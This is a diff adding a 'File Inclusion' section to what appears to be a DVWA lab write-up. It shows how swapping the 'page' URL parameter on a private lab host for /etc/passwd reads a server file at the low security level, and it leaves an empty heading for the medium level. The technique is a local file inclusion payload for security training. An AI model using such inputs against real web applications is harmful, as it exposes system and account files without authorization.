@@ -314,6 +314,22 @@ on visiting this url it will read token from DOM and create password change requ
 
 ### File Inclusion
 
+**Security level is currently: low.**
+
+In url there is GET parameter `page` used for including file.
+
+url:`http://192.168.170.131/vulnerabilities/fi/?page=include.php`
+
+By changing this file location we can read file on server.
+
+url:`http://192.168.170.131/vulnerabilities/fi/?page=/etc/passwd`
+
+<img width="658" alt="image" src="https://user-images.githubusercontent.com/79740895/185410392-bf62fdae-c6c7-4f90-a934-191ffadcf471.png">
+
+
+**Security level is currently: medium.**
+
+
 
 
 ---
